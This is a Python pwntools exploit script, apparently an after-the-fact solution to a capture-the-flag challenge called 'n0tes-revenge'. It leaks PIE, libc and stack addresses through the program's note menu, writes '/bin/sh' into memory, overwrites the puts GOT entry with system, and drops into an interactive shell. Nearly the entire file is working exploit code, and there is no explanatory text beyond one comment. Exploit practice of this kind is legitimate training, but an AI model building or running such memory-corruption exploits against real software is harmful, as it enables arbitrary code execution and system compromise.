#!/usr/bin/env python


# this is only an up-solve since I didn't attend the ctf
from pwn import *

elf = context.binary = ELF("./n0tes-revenge", checksec = False)

conn = elf.process()
libc = elf.libc

def cmd(choice):
    conn.recvuntil(b'>> ')
    conn.sendline(str(choice).encode())



def alloc(content):
    cmd(1)
    conn.sendlineafter(b'Content: ', content)

def edit(offset, content):
    cmd(2)
    conn.sendlineafter(b'Offset: ', str(offset).encode())
    conn.recvuntil(b'): ')
    conn.sendline(content)

def show():
    cmd(3)

def delete():
    cmd(4)
    conn.recvuntil(b'@')
    leak = int(conn.recv(14).decode(), 16)
    return leak

def edit_leak(offset, content):
    cmd(2)
    conn.recvuntil(b'Offset: ')
    conn.sendline(str(offset).encode())
    conn.recvline()
    conn.recvline()
    leak = u64(conn.recv(6).ljust(8, b'\x00'))
    conn.recvuntil(b'chars):')
    conn.sendline(content)
    return leak

pie_leak = delete() 

pie_base = pie_leak - 0x11f9

elf.address = pie_base

alloc(b'AAAA')

log.info("PIE: " + hex(pie_base))

libc_leak = edit_leak(0x3020, b'')

log.info("Libc leak: " + hex(libc_leak))
libc_base = libc_leak - 0x174af0
libc.address = libc_base

log.info("Libc base: " + hex(libc_base))

stack_leak = edit_leak(0x42e8, b'')
log.info("Stack leak: " + hex(stack_leak))

origin_buffer = stack_leak - 0x4888
log.info("buffer: " + hex(origin_buffer))

for i in range(15):
    alloc(b'A')

cmd(1)

cmd(1)

puts_got = elf.got['puts']
system = libc.symbols['system']
edit(pie_base + 0x3740, b'/bin/sh'.ljust(16, b'\x00'))
edit(puts_got, p64(system))

# gdb.attach(conn)

conn.interactive()
